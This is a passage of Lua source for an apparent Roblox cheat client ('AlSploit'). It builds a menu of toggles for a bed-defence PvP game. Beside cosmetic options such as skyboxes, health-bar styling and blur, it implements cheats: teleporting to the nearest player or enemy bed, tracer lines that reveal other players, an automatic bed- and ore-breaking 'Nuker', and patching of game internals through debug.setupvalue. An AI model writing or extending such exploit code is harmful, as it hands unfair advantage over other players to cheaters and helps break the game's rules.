					Settings.CustomInventory.Value = not Settings.CustomInventory.Value

					if Settings.CustomInventory.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.CustomInventory.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local CustomHealthBar, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "CustomHealth", Settings.CustomHealthBar.Value, function(CallBack)
		Settings.CustomHealthBar.Value = CallBack

		task.spawn(function()
			LocalPlayer.CharacterAdded:Connect(function()
				repeat task.wait() until IsAlive(LocalPlayer)

				task.spawn(function()
					if Settings.CustomHealthBar.Value == true then
						task.spawn(function()
							for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do	
								if v:IsA("Frame") then
									local UICorner = Instance.new("UICorner")

									UICorner.Parent = v
									UICorner.CornerRadius= UDim.new(0, 4)

									v.BackgroundColor3 = Color3.new(0.635294, 0.313725, 1)
								end
							end
						end)

						task.spawn(function()
							for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):GetDescendants() do	
								if v:IsA("Frame") and v.Name == "HotbarHealthbarContainer" then
									local UICorner = Instance.new("UICorner")

									UICorner.Parent = v
									UICorner.CornerRadius= UDim.new(0, 4)
								end
							end
						end)					
					end
				end)	
			end)			
		end)

		task.spawn(function()
			if Settings.CustomHealthBar.Value == true then
				task.spawn(function()
					for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do	
						if v:IsA("Frame") then
							local UICorner = Instance.new("UICorner")

							UICorner.Parent = v
							UICorner.CornerRadius= UDim.new(0, 4)

							v.BackgroundColor3 = Color3.new(0.635294, 0.313725, 1)
						end
					end
				end)

				task.spawn(function()
					for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):GetDescendants() do	
						if v:IsA("Frame") and v.Name == "HotbarHealthbarContainer" then
							local UICorner = Instance.new("UICorner")

							UICorner.Parent = v
							UICorner.CornerRadius= UDim.new(0, 4)
						end
					end
				end)					
			end
		end)

		task.spawn(function()
			if Settings.CustomHealthBar.Value == false then
				task.spawn(function()
					for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):FindFirstChild("HotbarHealthbarContainer"):GetDescendants() do	
						task.spawn(function()
							if v:IsA("Frame") then
								v.BackgroundColor3 = Color3.new(0.796078, 0.211765, 0.141176)
							end
						end)

						task.spawn(function()
							if v:IsA("UICorner") then
								v:Destroy()
							end
						end)
					end
				end)				

				task.spawn(function()
					for i, v in next, LocalPlayer.PlayerGui.hotbar:FindFirstChild("1"):GetDescendants() do	
						if v:IsA("Frame") and v.Name == "HotbarHealthbarContainer" then
							if v:FindFirstChild("UICorner") then
								v:FindFirstChild("UICorner"):Destroy()
							end
						end
					end
				end)	
			end
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.CustomHealthBar.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.CustomHealthBar.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.CustomHealthBar.KeyBind then
					Settings.CustomHealthBar.Value = not Settings.CustomHealthBar.Value

					if Settings.CustomHealthBar.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.CustomHealthBar.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local NoNameTag, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "NoNameTag", Settings.NoNameTag.Value, function(CallBack)
		Settings.NoNameTag.Value = CallBack

		task.spawn(function()
			if Settings.NoNameTag.Value == true then
				if IsAlive(LocalPlayer) and LocalPlayer.Character.Head:FindFirstChild("Nametag") then					
					task.spawn(function()
						if ReplicatedStorage:FindFirstChild("Nametag") and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
							ReplicatedStorage.Nametag:Destroy()
						end
					end)

					LocalPlayer.Character.Head.Nametag.Parent = ReplicatedStorage

					task.spawn(function()
						LocalPlayer.CharacterAdded:Connect(function(Character)
							repeat task.wait() until IsAlive(LocalPlayer)
							
							task.wait(0.3)

							if LocalPlayer.Character.Head:FindFirstChild("Nametag") then
								if ReplicatedStorage:FindFirstChild("Nametag") and LocalPlayer.Character.Head:FindFirstChild("Nametag") then
									ReplicatedStorage.Nametag:Destroy()
								end

								LocalPlayer.Character.Head.Nametag.Parent = ReplicatedStorage								
							end
						end)
					end)
				end
			end
		end)			

		task.spawn(function()
			if Settings.NoNameTag.Value == false then
				local NameTag = ReplicatedStorage:FindFirstChild("Nametag")

				if IsAlive(LocalPlayer) and NameTag and not LocalPlayer.Character.Head:FindFirstChild("Nametag") then
					NameTag.Parent = LocalPlayer.Character.Head
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.NoNameTag.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.NoNameTag.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.NoNameTag.KeyBind then
					Settings.NoNameTag.Value = not Settings.NoNameTag.Value

					if Settings.NoNameTag.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.NoNameTag.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local MotionBlur, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "MotionBlur", Settings.MotionBlur.Value, function(CallBack)
		Settings.MotionBlur.Value = CallBack

		task.spawn(function()
			if Settings.MotionBlur.Value == true then
				local MotionBlur = Instance.new("BlurEffect")

				MotionBlur.Parent = LightingService
				MotionBlur.Name = "MotionBlur"
				MotionBlur.Size = 3

				local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect")

				ColorCorrectionEffect.Saturation = 0.2

				ColorCorrectionEffect.Parent = LightingService
				ColorCorrectionEffect.Name = "ColorCorrectionEffect"		
			end
		end)			

		task.spawn(function()
			if Settings.MotionBlur.Value == false and LightingService:FindFirstChild("ColorCorrectionEffect") and LightingService:FindFirstChild("MotionBlur") then
				LightingService.ColorCorrectionEffect:Destroy()
				LightingService.MotionBlur:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.MotionBlur.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.MotionBlur.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.MotionBlur.KeyBind then
					Settings.MotionBlur.Value = not Settings.MotionBlur.Value

					if Settings.MotionBlur.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.MotionBlur.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local WinterSky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "WinterSky", Settings.WinterSky.Value, function(CallBack)
		Settings.WinterSky.Value = CallBack

		task.spawn(function()
			if Settings.WinterSky.Value == true then
				task.spawn(function()
					if LightingService:FindFirstChild("Sky") then
						LightingService.Sky.Parent = ReplicatedStorage					
					end
				end)			

				task.spawn(function()
					task.spawn(function()
						local Sky = Instance.new("Sky")

						Sky.StarCount = 5000
						Sky.SkyboxUp = "rbxassetid://8139676647"
						Sky.SkyboxLf = "rbxassetid://8139676988"
						Sky.SkyboxFt = "rbxassetid://8139677111"
						Sky.SkyboxBk = "rbxassetid://8139677359"
						Sky.SkyboxDn = "rbxassetid://8139677253"
						Sky.SkyboxRt = "rbxassetid://8139676842"
						Sky.SunTextureId = "rbxassetid://6196665106"
						Sky.SunAngularSize = 11
						Sky.MoonTextureId = "rbxassetid://8139665943"
						Sky.MoonAngularSize = 30

						Sky.Parent = LightingService
						Sky.Name = "WinterSky"
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("SunRaysEffect") then
							LightingService:FindFirstChildOfClass("SunRaysEffect"):Destroy()

							local SunRay = Instance.new("SunRaysEffect")

							SunRay.Intensity = 0.03
							SunRay.Parent = LightingService
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("SunRaysEffect") then
							local SunRay = Instance.new("SunRaysEffect")

							SunRay.Intensity = 0.03
							SunRay.Parent = LightingService
						end
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("BloomEffect") then
							LightingService:FindFirstChildOfClass("BloomEffect"):Destroy()

							local Bloom = Instance.new("BloomEffect")

							Bloom.Threshold = 2
							Bloom.Intensity = 1
							Bloom.Size = 2
							Bloom.Parent = LightingService
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("BloomEffect") then
							local Bloom = Instance.new("BloomEffect")

							Bloom.Threshold = 2
							Bloom.Intensity = 1
							Bloom.Size = 2
							Bloom.Parent = LightingService
						end
					end)

					task.spawn(function()
						if LightingService:FindFirstChildOfClass("Atmosphere") then
							LightingService:FindFirstChildOfClass("Atmosphere"):Destroy()

							local Atmosphere = Instance.new("Atmosphere")

							Atmosphere.Density = 0.3
							Atmosphere.Offset = 0.25
							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
							Atmosphere.Glare = 0
							Atmosphere.Haze = 0
							Atmosphere.Parent = LightingService
						end
					end)

					task.spawn(function()
						if not LightingService:FindFirstChildOfClass("Atmosphere") then
							local Atmosphere = Instance.new("Atmosphere")

							Atmosphere.Density = 0.3
							Atmosphere.Offset = 0.25
							Atmosphere.Color = Color3.new(0.776471, 0.776471, 0.776471)
							Atmosphere.Decay = Color3.new(0.407843, 0.439216, 0.486275)
							Atmosphere.Glare = 0
							Atmosphere.Haze = 0
							Atmosphere.Parent = LightingService
						end
					end)	
				end)

				task.spawn(function()
					if LightingService:FindFirstChild("GalaxySky")then
						LightingService:FindFirstChild("GalaxySky"):Destroy()					
					end
				end)
			end
		end)

		task.spawn(function()
			if Settings.WinterSky.Value == false then
				if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("WinterSky") then
					ReplicatedStorage:FindFirstChild("Sky").Parent = LightingService 		

					LightingService:FindFirstChild("WinterSky"):Destroy()	
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.WinterSky.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.WinterSky.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.WinterSky.KeyBind then
					Settings.WinterSky.Value = not Settings.WinterSky.Value

					if Settings.WinterSky.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.WinterSky.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
		Settings.GalaxySky.Value = CallBack

		task.spawn(function()
			if Settings.GalaxySky.Value == true then
				if LightingService:FindFirstChild("Sky") then
					LightingService.Sky.Parent = ReplicatedStorage

					local Sky = Instance.new("Sky")
					local ID = 8281961896

					Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
					Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID

					Sky.Parent = LightingService
					Sky.Name = "GalaxySky"
				end
			end
		end)

		task.spawn(function()
			if Settings.GalaxySky.Value == true and LightingService:FindFirstChild("WinterSky") then
				LightingService.WinterSky:Destroy()

				local Sky = Instance.new("Sky")
				local ID = 8281961896

				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. ID
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. ID

				Sky.Parent = LightingService
				Sky.Name = "GalaxySky"
			end
		end)	

		task.spawn(function()
			if Settings.GalaxySky.Value == false then
				if ReplicatedStorage:FindFirstChild("Sky") and LightingService:FindFirstChild("GalaxySky") then
					ReplicatedStorage.Sky.Parent = LightingService 

					LightingService.GalaxySky:Destroy()				
				end
			end
		end)		
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.GalaxySky.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.GalaxySky.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.GalaxySky.KeyBind then
					Settings.GalaxySky.Value = not Settings.GalaxySky.Value

					if Settings.GalaxySky.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.GalaxySky.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Indicators, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Indicators", Settings.Indicators.Value, function(CallBack)
		Settings.Indicators.Value = CallBack

		task.spawn(function()
			local OldObject = debug.getupvalue(DamageIndicator, 10)

			task.spawn(function()
				if Settings.Indicators.Value == true then
					local Messages = {"AlSploit", "Best Client", ":D", "💀"}

					debug.setupvalue(DamageIndicator, 10, {
						Create = function(self, Object, ...)
							local Message = Messages[math.random(#Messages)]

							Object.Parent.Text = Message
							Object.Parent.TextColor3 = Color3.fromHSV(tick() % 10 / 10, 2, 2)

							task.spawn(function()
								task.wait(0.75)

								if Settings.Indicators.Value == true then
									Object.Parent:Destroy()
								end
							end)
						end
					})
				end
			end)

			task.spawn(function()
				if Settings.Indicators.Value == false then
					debug.setupvalue(DamageIndicator, 10, {
						Create = function(self, Object, ...)
							Object = OldObject

							task.spawn(function()
								task.wait(0.5)

								if Settings.Indicators.Value == false then
									Object.Parent:Destroy()
								end								
							end)
						end
					})
				end
			end)			
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Indicators.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Indicators.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Indicators.KeyBind then
					Settings.Indicators.Value = not Settings.Indicators.Value

					if Settings.Indicators.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Indicators.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local AntiVoid, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "AntiVoid", Settings.AntiVoid.Value, function(CallBack)
		Settings.AntiVoid.Value = CallBack

		task.spawn(function()
			if Settings.AntiVoid.Value == true then
				CreateAntiVoidPart()
			end
		end)

		task.spawn(function()
			if Settings.AntiVoid.Value == false then
				if AntiVoidPart then
					AntiVoidPart:Destroy()
				end
			end
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.AntiVoid.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.AntiVoid.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.AntiVoid.KeyBind then
					Settings.AntiVoid.Value = not Settings.AntiVoid.Value

					if Settings.AntiVoid.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.AntiVoid.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateSlider(WorldTab, "Transparency", Settings.AntiVoid.Transparency * 100, 100, LayoutOrder + 2, function(CallBack)
					Settings.AntiVoid.Transparency = CallBack / 100

					task.spawn(function()
						if AntiVoidPart then
							AntiVoidPart.Transparency = Settings.AntiVoid.Transparency
						end
					end)
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)
end)

task.spawn(function()
	local PlayerTp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "PlayerTp", Settings.PlayerTp.Value, function(CallBack)
		Settings.PlayerTp.Value = CallBack

		task.spawn(function()
			if Settings.PlayerTp.Value == true then
				if IsAlive(LocalPlayer) then
					repeat task.wait() until GetMatchState() ~= 0

					local NearestPlayer = FindNearestPlayer()

					task.spawn(function()
						if NearestPlayer then
							KillHumanoid()

							LocalPlayer.CharacterAdded:Connect(function()
								repeat task.wait() until IsAlive(LocalPlayer) and GetMatchState() ~= 0

								if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
									task.wait(0.15)

									TweenToNearestPlayer()
								end
							end)
						end	
					end)					
				end

				task.spawn(function()
					if not IsAlive(LocalPlayer) then
						LocalPlayer.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(LocalPlayer) and GetMatchState() ~= 0					

							if IsAlive(LocalPlayer) and Settings.PlayerTp.Value == true and FindNearestPlayer() then
								task.wait(0.25)

								TweenToNearestPlayer()
							end
						end)
					end
				end)				
			end	
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.PlayerTp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.PlayerTp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.PlayerTp.KeyBind then
					Settings.PlayerTp.Value = not Settings.PlayerTp.Value

					if Settings.PlayerTp.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.PlayerTp.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Tracers, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Tracers", Settings.Tracers.Value, function(CallBack)
		Settings.Tracers.Value = CallBack

		task.spawn(function()
			repeat task.wait() until GetMatchState() ~= 0

			if Settings.Tracers.Value == true then
				task.spawn(function()
					for i, v in next, PlayerService:GetPlayers() do
						if IsAlive(v) and v ~= LocalPlayer then
							CreateTracer(v)
						end

						v.CharacterAdded:Connect(function(Character)
							repeat task.wait() until IsAlive(PlayerService:FindFirstChild(Character.Name))


							if Settings.Esp.Value == true and IsAlive(PlayerService:FindFirstChild(Character.Name)) and v ~= LocalPlayer and not v.Character.PrimaryPart:FindFirstChild("Esp") then
								CreateTracer(v)
							end
						end)
					end
				end)

				task.spawn(function()
					repeat task.wait() until GetMatchState() ~= 0

					PlayerService.PlayerAdded:Connect(function(Player)
						Player.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(Player)

							if Settings.Esp.Value == true and IsAlive(Player) and Player ~= LocalPlayer then
								CreateTracer(Player)
							end
						end)
					end)
				end)
			end
		end)	
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Tracers.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Tracers.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Tracers.KeyBind then
					Settings.Tracers.Value = not Settings.Tracers.Value

					if Settings.Tracers.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Tracers.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local BedTp, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "BedTp", Settings.BedTp.Value, function(CallBack)
		Settings.BedTp.Value = CallBack

		task.spawn(function()
			if Settings.BedTp.Value == true then
				if IsAlive(LocalPlayer) then
					repeat task.wait() until GetMatchState() ~= 0

					local NearestPlayer = FindNearestPlayer()

					task.spawn(function()
						if NearestPlayer then
							KillHumanoid()

							LocalPlayer.CharacterAdded:Connect(function()
								repeat task.wait() until IsAlive(LocalPlayer)

								if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
									task.wait(0.15)

									TweenToNearestBed()
								end
							end)
						end	
					end)					
				end

				task.spawn(function()
					if not IsAlive(LocalPlayer) then
						LocalPlayer.CharacterAdded:Connect(function()
							repeat task.wait() until IsAlive(LocalPlayer)						

							if IsAlive(LocalPlayer) and Settings.BedTp.Value == true and FindNearestPlayer() then
								task.wait(0.25)

								TweenToNearestBed()
							end
						end)
					end
				end)				
			end	
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.BedTp.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.BedTp.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.BedTp.KeyBind then
					Settings.BedTp.Value = not Settings.BedTp.Value

					if Settings.BedTp.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.BedTp.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)
end)

task.spawn(function()
	local Nuker, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Nuker", Settings.Nuker.Value, function(CallBack)
		Settings.Nuker.Value = CallBack

		task.spawn(function()
			repeat
				task.wait(0.1)

				if IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
					local NearestBed = FindNearestBed(Settings.Nuker.Range) or nil
					local NearestOre = FindNearestOre(Settings.Nuker.Range) or nil

					task.spawn(function()
						if NearestBed or NearestOre then
							Nuker(NearestBed, NearestOre)
						end
					end)

					task.spawn(function()
						if not NearestBed then
							NearestBedFound = false
						end
					end)
				end
			until Settings.Nuker.Value == false

			NearestBedFound = false
		end)

		task.spawn(function()
			repeat
				task.wait()

				if Settings.Nuker.CustomAnimation == true and IsAlive(LocalPlayer) and NearestBedFound and CanSeeNearestBed and not NearestEntityFound then
					task.wait(0.25)

					ViewmodelController:playAnimation(15)
				end
			until not game
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateKeyBind(WorldTab, Settings.Nuker.KeyBind, LayoutOrder + 1, function(CallBack)
					Settings.Nuker.KeyBind = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		UserInputService.InputBegan:Connect(function(Input)
			if not UserInputService:GetFocusedTextBox() then
				if Input.KeyCode.Name == Settings.Nuker.KeyBind then
					Settings.Nuker.Value = not Settings.Nuker.Value

					if Settings.Nuker.Value == true then
						UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
					end

					if Settings.Nuker.Value == false then
						UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}
					end
				end
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(WorldTab, "CustomAnimation", Settings.Nuker.CustomAnimation, LayoutOrder + 2, function(CallBack)
					Settings.Nuker.CustomAnimation = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

		DropDownButton.Activated:Connect(function()
			Value = not Value

			if Value == true then
				InstanceUI = CreateMiniToggle(WorldTab, "BreakOres", Settings.Nuker.BreakOres, LayoutOrder + 3, function(CallBack)
					Settings.Nuker.BreakOres = CallBack
				end)
			end

			if Value == false then
				InstanceUI:Destroy()
			end
		end)
	end)

	task.spawn(function()
		local InstanceUI
		local Value = false

